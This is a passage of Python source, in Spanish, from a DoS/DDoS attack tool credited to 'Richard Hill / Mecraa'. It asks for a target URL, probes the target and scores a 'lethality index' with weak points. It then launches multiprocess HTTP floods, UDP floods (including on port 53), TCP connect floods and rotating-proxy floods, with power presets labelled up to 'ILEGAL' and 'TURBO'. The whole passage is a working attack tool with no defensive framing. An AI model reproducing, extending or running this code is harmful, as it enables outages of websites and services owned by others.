        p_warn("aiohttp no disponible: ejecutando el motor DOS en su lugar.")
        orchestrate(vector)
        return

    AGG = Counters()
    q = mp.Queue()
    stop_ev = mp.Event()
    STOP_EV = stop_ev
    state = {"procs": []}

    per = max(1, CFG.ddos_direct_conns // CFG.procs)
    for _ in range(CFG.procs):
        p = mp.Process(target=child_main, args=(CFG.as_dict(), per, q, stop_ev), daemon=True)
        p.start()
        state["procs"].append(p)

    threads = []
    if CFG.ddos_use_udp:
        uport = CFG.ddos_udp_port or CFG.port
        for _ in range(CFG.ddos_udp_threads):
            t = threading.Thread(target=udp_flood_worker, args=(CFG.ip, uport), daemon=True)
            t.start()
            threads.append(t)
        if uport != 53:
            t = threading.Thread(target=udp_flood_worker, args=(CFG.ip, 53), daemon=True)
            t.start()
            threads.append(t)
    if CFG.ddos_use_tcp:
        for _ in range(CFG.ddos_tcp_threads):
            t = threading.Thread(target=tcp_connect_worker, args=(CFG.ip, CFG.port), daemon=True)
            t.start()
            threads.append(t)

    start = time.time()
    try:
        asyncio.run(_ddos_main(q, stop_ev, start, state))
    except KeyboardInterrupt:
        pass
    finally:
        stop_ev.set()
        for p in state["procs"]:
            p.join(timeout=4)
        for p in state["procs"]:
            if p.is_alive():
                p.terminate()
        for t in threads:
            t.join(timeout=2)

        elapsed = int(time.time() - start)
        avg = AGG.requests / max(elapsed, 1)
        clear()
        body = kv_block([
            ("Duracion", f"{elapsed} s"),
            ("Peticiones HTTP", f"{AGG.requests + LOCAL.requests:,}"),
            ("Media HTTP", f"{avg:,.0f} req/s"),
            ("Paquetes UDP", f"{LOCAL.udp:,}"),
            ("Conexiones TCP", f"{LOCAL.tcp_conn:,}"),
            ("Proxies ok / muertos", f"{LOCAL.proxy_ok} / {LOCAL.proxy_bad}"),
            ("Timeouts", f"{AGG.timeouts + LOCAL.timeouts}"),
            ("Errores", f"{AGG.errors + LOCAL.errors}"),
        ], 100)
        lines, _, _ = frame("D D O S   F I N A L I Z A D O", body,
                            C.LRED + ">> By Richard Hill / DDOS: Mecraa <<" + C.RESET)
        print("\n".join(lines))


# ----------------------------------------------------------------------
#  DASHBOARD DOS
# ----------------------------------------------------------------------
def build_dashboard(rps, avg, vector, elapsed, procs_alive):
    h, m, s = elapsed // 3600, (elapsed % 3600) // 60, elapsed % 60
    tw, th = term_size()

    body = []
    body += kv_block([
        ("Objetivo", CFG.target_url()),
        ("IP destino", CFG.ip or "-"),
        ("Modo / Nucleos", f"{CFG.mode_name}  /  {procs_alive} procesos"),
        ("Vector", vector),
        ("Tiempo", f"{h:02d}:{m:02d}:{s:02d}"),
    ], 100)
    body.append(C.BRED + "-" * max(10, min(tw - 6, 104)) + C.RESET)
    body += kv_block([
        ("Conexiones", f"{AGG.conns} / {CFG.conns}"),
        ("Peticiones", f"{AGG.requests:,}"),
        ("Velocidad", f"{rps:,.0f} req/s   (media {avg:,.0f} req/s)"),
        ("Trafico", f"{AGG.bytes/1e6:.1f} MB"),
        ("Errores", f"{AGG.errors}   timeouts {AGG.timeouts}"),
    ], 100)

    bar_len = max(20, min(tw - 12, 60))
    filled = int(bar_len * min(rps / 8000.0, 1.0)) if rps else 0
    body.append("")
    body.append(C.BRED + "[" + C.LRED + "#" * filled + C.GREY +
                "-" * (bar_len - filled) + C.BRED + "]" + C.RESET)

    footer = C.LRED + ">> By Richard Hill <<" + C.RESET + C.GREY + "     Ctrl+C para detener" + C.RESET
    return frame("M O T O R   D O S   -   M U L T I - C O R E", body, footer)


def draw_dashboard(rps, avg, vector, elapsed, procs_alive):
    lines, w, inner = build_dashboard(rps, avg, vector, elapsed, procs_alive)
    home()
    sys.stdout.write("\n".join(lines) + "\033[J\n")
    sys.stdout.flush()


# ----------------------------------------------------------------------
#  DASHBOARD DDOS
# ----------------------------------------------------------------------
def build_ddos(rps, avg, elapsed, procs_alive, proxies):
    h, m, s = elapsed // 3600, (elapsed % 3600) // 60, elapsed % 60
    tw, th = term_size()

    body = []
    body += kv_block([
        ("Objetivo", CFG.target_url()),
        ("IP destino", CFG.ip or "-"),
        ("Modo / Nucleos", f"{CFG.mode_name}  /  {procs_alive} procesos + {CFG.ddos_workers} workers"),
        ("Vector", "PROXY FLOOD + FLOOD DIRECTO + UDP + TCP CONNECT"),
        ("Tiempo", f"{h:02d}:{m:02d}:{s:02d}"),
    ], 100)
    body.append(C.BRED + "-" * max(10, min(tw - 6, 104)) + C.RESET)
    body += kv_block([
        ("HTTP ok", f"{AGG.requests + LOCAL.requests:,}"),
        ("Velocidad", f"{rps:,.0f} req/s   (media {avg:,.0f} req/s)"),
        ("UDP enviados", f"{LOCAL.udp:,} pkt"),
        ("TCP conectados", f"{LOCAL.tcp_conn:,}"),
        ("Conexiones vivas", f"{AGG.conns + LOCAL.conns}"),
        ("Proxies vivos", f"{len(PROXIES)}   muertos {LOCAL.proxy_bad}"),
        ("Timeouts / errores", f"{AGG.timeouts + LOCAL.timeouts} / {AGG.errors + LOCAL.errors}"),
    ], 100)

    bar_len = max(20, min(tw - 12, 60))
    filled = int(bar_len * min(rps / 12000.0, 1.0)) if rps else 0
    body.append("")
    body.append(C.BRED + "[" + C.LRED + "#" * filled + C.GREY +
                "-" * (bar_len - filled) + C.BRED + "]" + C.RESET)

    footer = (C.LRED + "EXPERIMENTAL" + C.RESET + C.GREY +
              "   Ctrl+C para detener   >> By Richard Hill / Mecraa <<" + C.RESET)
    return frame("D D O S   -   M U L T I - V E C T O R", body, footer)


def draw_ddos(rps, avg, elapsed, procs_alive, proxies):
    lines, w, inner = build_ddos(rps, avg, elapsed, procs_alive, proxies)
    home()
    sys.stdout.write("\n".join(lines) + "\033[J\n")
    sys.stdout.flush()


# ----------------------------------------------------------------------
#  ORQUESTADOR DOS
# ----------------------------------------------------------------------
def orchestrate(vector):
    global AGG, STOP_EV
    AGG = Counters()
    q = mp.Queue()
    stop_ev = mp.Event()
    STOP_EV = stop_ev

    per = max(1, CFG.conns // CFG.procs)
    real_total = per * CFG.procs
    procs = [mp.Process(target=child_main, args=(CFG.as_dict(), per, q, stop_ev),
                        daemon=True) for _ in range(CFG.procs)]
    for p in procs:
        p.start()

    start = time.time()
    last_req, last_t = 0, time.time()
    try:
        while any(p.is_alive() for p in procs):
            while True:
                try:
                    (dreq, derr, dbytes, dtout), cconns = q.get_nowait()
                except Exception:
                    break
                AGG.requests += dreq
                AGG.errors += derr
                AGG.bytes += dbytes
                AGG.timeouts += dtout
                AGG.conns = cconns
            AGG.conns = min(AGG.conns if AGG.conns else 0, real_total)

            now = time.time()
            dt = max(now - last_t, 1e-6)
            rps = (AGG.requests - last_req) / dt
            last_req, last_t = AGG.requests, now
            elapsed = int(now - start)
            avg = AGG.requests / max(now - start, 1e-6)
            alive = sum(1 for p in procs if p.is_alive())
            draw_dashboard(rps, avg, vector, elapsed, alive)
            time.sleep(0.5)
    except KeyboardInterrupt:
        stop_ev.set()
        for p in procs:
            p.join(timeout=5)
        for p in procs:
            if p.is_alive():
                p.terminate()
        elapsed = int(time.time() - start)
        avg = AGG.requests / max(elapsed, 1)
        clear()
        body = kv_block([
            ("Duracion", f"{elapsed} s"),
            ("Peticiones", f"{AGG.requests:,}"),
            ("Media", f"{avg:,.0f} req/s"),
            ("Trafico", f"{AGG.bytes/1e6:.1f} MB"),
            ("Errores", f"{AGG.errors}"),
        ], 100)
        lines, _, _ = frame("ATAQUE FINALIZADO", body,
                            C.LRED + ">> By Richard Hill <<" + C.RESET)
        print("\n".join(lines))


# ----------------------------------------------------------------------
#  PRESENTACION
# ----------------------------------------------------------------------
def show_analysis(a, lethal, weak, notes, vector):
    tw, th = term_size()
    body = kv_block([
        ("Estado", "VIVO" if a.get("alive") else "SIN RESPUESTA"),
        ("Codigo HTTP", a.get("status") or "-"),
        ("Servidor", a.get("server") or "oculto"),
        ("Tecnologia", a.get("powered") or "oculta"),
        ("CDN / WAF", ("Cloudflare" if a.get("cf") else a.get("cdn")) or "no detectada"),
        ("Version HTTP", a.get("http_ver") or "1.1"),
        ("Latencia media", f"{a.get('latency_ms', 0):.0f} ms"),
        ("Compresion", a.get("encoding") or "ninguna"),
        ("Cookies", "si" if a.get("cookies") else "no"),
    ], 100)
    bar_len = 30
    filled = int(lethal / 100 * bar_len)
    col = C.GREEN if lethal >= 75 else C.YEL if lethal >= 50 else C.BRED
    body.append("")
    body.append(f"{C.RED}INDICE DE LETALIDAD{C.RESET}: {col}{lethal}%{C.RESET} "
                f"{col}[{'#'*filled}{'-'*(bar_len-filled)}]{C.RESET}")
    if weak:
        body.append("")
        body.append(C.LRED + "PUNTOS DEBILES" + C.RESET)
        for w in weak:
            body.append(f"{C.BRED}* {C.WHITE}{w}{C.RESET}")
    if notes:
        body.append("")
        body.append(C.LRED + "AJUSTES AUTOMATICOS" + C.RESET)
        for n in notes:
            body.append(f"{C.LRED}-> {C.WHITE}{n}{C.RESET}")
    lines, _, _ = frame("RECONOCIMIENTO DEL OBJETIVO", body,
                        C.LRED + ">> By Richard Hill <<" + C.RESET)
    print("\n".join(lines))


def show_plan(vector, kind="dos"):
    if kind == "ddos":
        rows = [
            ("Objetivo", CFG.target_url()),
            ("IP destino", CFG.ip or "-"),
            ("Modo", CFG.mode_name),
            ("Nucleos (flood directo)", CFG.procs),
            ("Conexiones directas", CFG.ddos_direct_conns),
            ("Workers con proxy", CFG.ddos_workers),
            ("Hilos UDP / TCP", f"{CFG.ddos_udp_threads} / {CFG.ddos_tcp_threads}"),
            ("Max concurrencia", CFG.ddos_max_conc),
            ("Cache-buster", "ON" if CFG.cache_bust else "OFF"),
        ]
    else:
        rows = [
            ("Objetivo", CFG.target_url()),
            ("IP destino", CFG.ip or "-"),
            ("Modo", CFG.mode_name),
            ("Nucleos usados", CFG.procs),
            ("Vector", vector),
            ("Conexiones totales", CFG.conns),
            ("Flood / Hold", f"{int(CFG.flood_ratio*100)}% / {int((1-CFG.flood_ratio)*100)}%"),
            ("Cierre por conexion", f"{int(CFG.close_ratio*100)}%"),
            ("Cache-buster", "ON" if CFG.cache_bust else "OFF"),
        ]
    lines, _, _ = frame("PLAN DE ATAQUE FINAL", kv_block(rows, 100),
                        C.LRED + ">> By Richard Hill <<" + C.RESET)
    print("\n".join(lines))


def spinner(stop_ev, text):
    frames = "|/-\\"
    i = 0
    while not stop_ev.is_set():
        sys.stdout.write(f"\r{C.LRED}  {frames[i % 4]} {C.WHITE}{text}{C.RESET}   ")
        sys.stdout.flush()
        time.sleep(0.08)
        i += 1
    sys.stdout.write("\r" + " " * 70 + "\r")


# ----------------------------------------------------------------------
#  PRESETS
# ----------------------------------------------------------------------
MODOS = {
    "1": ("SUAVE", 400),
    "2": ("NORMAL", 1200),
    "3": ("BRUTAL", 3000),
    "4": ("ILEGAL", 6000),
    "5": ("TURBO", 10000),
}

MODOS_DDOS = {
    "1": ("SUAVE", 800, 400, 3, 3),
    "2": ("NORMAL", 1800, 900, 4, 4),
    "3": ("BRUTAL", 3500, 2000, 6, 6),
    "4": ("ILEGAL", 6000, 4000, 8, 8),
    "5": ("TURBO", 10000, 6000, 12, 12),
}


def apply_mode(k, kind):
    if kind == "ddos":
        name, workers, direct, udp_t, tcp_t = MODOS_DDOS.get(k, MODOS_DDOS["3"])
        CFG.mode_name = name
        CFG.ddos_workers = workers
        CFG.ddos_direct_conns = direct
        CFG.ddos_udp_threads = udp_t
        CFG.ddos_tcp_threads = tcp_t
        CFG.ddos_max_conc = max(1500, workers)
    else:
        CFG.mode_name, CFG.conns = MODOS.get(k, MODOS["3"])
        CFG.flood_ratio = 1.0


# ----------------------------------------------------------------------
#  FLUJO
# ----------------------------------------------------------------------
def run_recon():
    ev = threading.Event()
    t = threading.Thread(target=spinner, args=(ev, "Analizando objetivo..."), daemon=True)
    t.start()
    try:
        ip = asyncio.run(resolve_async(CFG.host, CFG.port))
        CFG.ip = ip
        a = asyncio.run(recon(ip))
    except (socket.gaierror, OSError) as e:
        a = {"alive": False, "error": str(e)}
    finally:
        ev.set()
        t.join()
    return a


def parse_target(target):
    target = target.strip()
    if not target:
        raise ValueError("URL vacia")
    if "://" not in target:
        target = "http://" + target
    u = urlparse(target)
    if not u.hostname:
        raise ValueError("URL sin host")
    CFG.host = u.hostname
    CFG.https = (u.scheme == "https")
    CFG.port = u.port if u.port else (443 if CFG.https else 80)
    CFG.path = u.path if u.path else "/"
    if u.query:
        CFG.path += "?" + u.query


def ask_url():
    url = input(f"{C.LRED}  ? {C.WHITE}URL objetivo: {C.RESET}").strip()
    if not url:
        return False
    try:
        parse_target(url)
    except Exception as e:
        p_err(f"URL invalida: {e}")
        time.sleep(1.2)
        return False
    return True


def show_selector():
    body = [
        f"{C.BRED}1{C.RESET}) {C.LRED}DOS{C.RESET}   {C.WHITE}ataque directo, sin proxies.{C.RESET}",
        f"   {C.GREY}Multiproceso + flood keep-alive + slow hold. Maxima potencia local.{C.RESET}",
        "",
        f"{C.BRED}2{C.RESET}) {C.YEL}DDOS{C.RESET}  {C.BRED}(experimental){C.RESET}",
        f"   {C.GREY}Proxies rotativos + flood directo + UDP + TCP connect, todo a la vez.{C.RESET}",
        f"   {C.GREY}Requiere aiohttp + aiohttp_socks. Mas lento de arrancar, mas ancho de ataque.{C.RESET}",
    ]
    lines, _, _ = frame("S E L E C C I O N A   E L   V E C T O R", body,
                        C.LRED + ">> By Richard Hill <<" + C.RESET)
    print("\n".join(lines))


def select_kind():
    show_selector()
    print()
    op = input(f"{C.LRED}  >> {C.WHITE}Vector [1=DoS / 2=DDoS]: {C.RESET}").strip() or "1"
    return "ddos" if op == "2" else "dos"


def prepare_ddos():
    global PROXIES
    PROXIES = []

    if not HAS_AIOHTTP:
        p_warn("aiohttp / aiohttp_socks no instalados: DDOS sin capa de proxies.")
        p_warn("Instala con: pip install aiohttp aiohttp_socks")
        CFG.ddos_use_proxies = False
        return True

    if CFG.ddos_use_proxies:
        raw = asyncio.run(load_proxies())
        if raw:
            valid = asyncio.run(validate_proxies(raw))
            PROXIES = valid
        if not PROXIES:
            p_warn("Sin proxies validos: se ataca solo con flood directo + UDP/TCP.")
    return True


def launch(kind):
    print(C.GREY + f"\n   Nucleos detectados: {os.cpu_count()}   procesos a usar: {CFG.procs}" + C.RESET)

    a = run_recon()
    lethal, weak, notes, vector = analyze(a)

    if not CFG.ip:
        p_err("No se pudo resolver el objetivo.")
        time.sleep(1.5)
        return

    clear()
    print_art()
    show_analysis(a, lethal, weak, notes, vector)
    if kind == "ddos":
        print()
        print(C.YEL + "   [DDOS EXPERIMENTAL] " + C.WHITE +
              "proxy flood + directo + UDP + TCP" + C.RESET)
    show_plan(vector, kind)
    print()

    ans = input(f"{C.BRED}  >> {C.WHITE}Confirmar y LANZAR? [S/n]: {C.RESET}").strip().lower()
    if ans not in ("", "s", "si", "y", "yes"):
        p_warn("Cancelado.")
        time.sleep(0.8)
        return

    if kind == "ddos":
        clear()
        print_art()
        print()
        prepare_ddos()
        print()
        input(f"{C.LRED}  >> {C.WHITE}Enter para iniciar el DDOS...{C.RESET}")
        orchestrate_ddos(vector)
    else:
        orchestrate(vector)


def easy_flow():
    clear()
    print_art()
    print()
    intro = [
        f"{C.WHITE}Pega la URL del objetivo. Analizo y lanzo el ataque optimizado.{C.RESET}",
        "",
        f"{C.GREY}Modos base: 1 SUAVE 2 NORMAL 3 BRUTAL 4 ILEGAL 5 TURBO{C.RESET}",
    ]
    lines, _, _ = frame("A T A Q U E   G U I D A D O", intro,
                        C.LRED + ">> By Richard Hill <<" + C.RESET)
    print("\n".join(lines))
    print()
    if not ask_url():
        return

    kind = select_kind()
    clear()
    print_art()
    print()
    k = input(f"{C.LRED}  ? {C.WHITE}Modo base [3]: {C.RESET}").strip() or "3"
    apply_mode(k, kind)

    launch(kind)


def direct_flow():
    clear()
    print_art()
    print()
    if not ask_url():
        return
    kind = select_kind()
    clear()
    print_art()
    print()
    k = input(f"{C.LRED}  ? {C.WHITE}Modo base [5]: {C.RESET}").strip() or "5"
    apply_mode(k, kind)
    launch(kind)


def main_menu():
    while True:
        clear()
        print_art()
        print()
        menu_body = [
            f"{C.BRED}1{C.RESET}) {C.LRED}ATAQUE GUIADO{C.RESET}  {C.GREY}(analiza y lanza){C.RESET}",
            f"{C.BRED}2{C.RESET}) {C.YEL}ATAQUE DIRECTO{C.RESET} {C.GREY}(URL + vector, sin guiado){C.RESET}",
            f"{C.BRED}3{C.RESET}) Modo de potencia   {C.GREY}(actual: {CFG.mode_name}){C.RESET}",
            f"{C.BRED}4{C.RESET}) Nucleos a usar     {C.GREY}(actual: {CFG.procs} de {os.cpu_count()}){C.RESET}",
            f"{C.BRED}0{C.RESET}) Salir",
        ]
        lines, _, _ = frame("M O T O R   D O S / D D O S   -   M U L T I - C O R E", menu_body,
                            C.LRED + ">> By Richard Hill <<" + C.RESET)
        print("\n".join(lines))
        op = input(f"{C.LRED}  >> {C.WHITE}Opcion [1]: {C.RESET}").strip() or "1"
        if op == "1":
            easy_flow()
        elif op == "2":
            direct_flow()
        elif op == "3":
            k = input(f"{C.LRED}  ? {C.WHITE}Modo 1-5: {C.RESET}").strip()
            if k in MODOS:
                apply_mode(k, "dos")
        elif op == "4":
            try:
                n = int(input(f"{C.LRED}  ? {C.WHITE}Procesos (1-{os.cpu_count()}): {C.RESET}").strip())
                CFG.procs = max(1, min(n, os.cpu_count()))
            except ValueError:
                pass
        elif op == "0":
            clear()
            print_art()
            print()
            p_ok("Saliendo... By Richard Hill")
            return
        else:
            p_warn("Opcion invalida.")
            time.sleep(0.5)


def main():
    if len(sys.argv) <= 1:
        main_menu()
        return

    ap = argparse.ArgumentParser(description="Motor DOS/DDOS Multi-Core - By Richard Hill")
    ap.add_argument("host")
    ap.add_argument("-c", "--conns", type=int, default=6000)
    ap.add_argument("-j", "--procs", type=int, default=CFG.procs)
    ap.add_argument("--path", default="/")
    ap.add_argument("--ddos", action="store_true", help="modo DDOS experimental")
    ap.add_argument("--workers", type=int, default=3500)
    ap.add_argument("--no-proxies", action="store_true")
    ap.add_argument("--no-udp", action="store_true")
    ap.add_argument("--no-tcp", action="store_true")
    args = ap.parse_args()

    try:
        parse_target(args.host)
    except Exception as e:
        p_err(f"Objetivo invalido: {e}")
        return

    CFG.procs = max(1, min(args.procs, os.cpu_count()))
    CFG.path = args.path if args.path.startswith("/") else "/" + args.path
    CFG.mode_name = "PERSONALIZADO"
    kind = "ddos" if args.ddos else "dos"

    if kind == "ddos":
        CFG.ddos_workers = args.workers
        CFG.ddos_direct_conns = args.conns
        CFG.ddos_use_proxies = not args.no_proxies
        CFG.ddos_use_udp = not args.no_udp
        CFG.ddos_use_tcp = not args.no_tcp
        CFG.ddos_max_conc = max(1500, args.workers)
    else:
        CFG.conns = args.conns

    clear()
    print_art()
    a = run_recon()
    lethal, weak, notes, vector = analyze(a)
    clear()
    print_art()
    show_analysis(a, lethal, weak, notes, vector)
    show_plan(vector, kind)

    if kind == "ddos":
        prepare_ddos()
        orchestrate_ddos(vector)
    else:
        orchestrate(vector)


if __name__ == "__main__":
    mp.freeze_support()
    try:
        main()
    except KeyboardInterrupt:
        print()
        p_ok("Cerrado. By Richard Hill")